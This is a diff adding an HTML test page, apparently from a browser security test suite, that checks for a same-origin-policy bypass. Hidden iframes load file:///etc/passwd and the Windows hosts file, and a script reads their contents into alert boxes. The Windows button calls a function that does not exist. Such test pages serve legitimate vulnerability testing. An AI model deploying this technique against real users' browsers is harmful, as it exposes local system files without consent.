@@ -1,0 +1,102 @@
+<html>
+	<head>
+		<title>Universal XSS (UXSS) SOP Bypass Vulnerability test</title>
+		<style type="text/css">
+			*{margin:0;padding:0;}
+			.wrapper {
+				width: 95%;
+				background-color: #16a085;
+				margin: 0 auto;
+				font-family: times new roman;
+				height: 88%;
+			}
+			.line {
+				background-color: #ecf0f1;
+				text-align: center;
+				padding: 10px;
+				color: #16a085;;
+			}
+			.main {
+				color: #fff;
+				padding: 10px;
+			}
+			.test {
+				width: 200px;
+				height: 40px;
+				background-color: #fff;
+				border: none;
+				border-radius: 100px;	
+				color: #16a085;
+				font-size: 1.6em;
+				margin: 0 auto;
+			}
+			.note {
+				background: #1abc9c;
+				color: #fff;
+				padding: 10px;
+				width: 95%;
+				margin: 0 auto;
+				margin-top: 40px;
+			}
+		</style>
+	</head>
+<body>
+
+
+<iframe src="file:///etc/passwd" name="myIframe" width="0px" height="0px"></iframe>
+<iframe src="file:///C:/Windows/System32/drivers/etc/hosts" name="myIframe2" width="0px" height="0px"></iframe>
+
+<script> 
+
+function myfunc()
+{
+var myIframe = frames.myIframe;
+var fenster = window.frames[0];
+var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
+var messages=message;
+messages = messages.replace(/#/g, "");
+alert(messages);
+alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
+ }
+ 
+function myfunc2(){
+
+var myIframe = frames.myIframe2;
+var fenster = window.frames[0];
+var message = fenster.document.getElementsByTagName("pre")[0].childNodes[0].nodeValue;
+var messages=message;
+messages = messages.replace(/#/g, "");
+alert(messages);
+alert(window.frames['myIframe'].document.getElementsByTagName('pre')[0].innerHTML);
+}
+ 
+</script>
+
+	<div class="wrapper">
+			<img src="and.png">
+	
+			<h3 class="line">SOP Bypass - Testcase 14</h3>	
+
+		<div class="main">
+				<p>Testcase for Cross Scheme Data Exposure</p>
+		</div>
+		
+		<center>	<input type="button" id="btn_test" class="test" value="Run Test Case 1 (Linux OS)" onclick="myfunc()" /></center>
+				<br><center>	<input type="button" id="btn_test" class="test" value="Run Test Case 2 (Windows OS)" onclick="myfuncwin()" /></center>
+
+
+		
+
+
+		</br></br>
+			<div class="note">
+			
+				<p><strong>Note:</strong> <br />
+					If page displays an alert box displaying the content of /etc/passwd file, it results in a Cross Scheme Data Exposure 
+				</p>
+			</div>
+	</div>
+
+
+</body>
+</html>
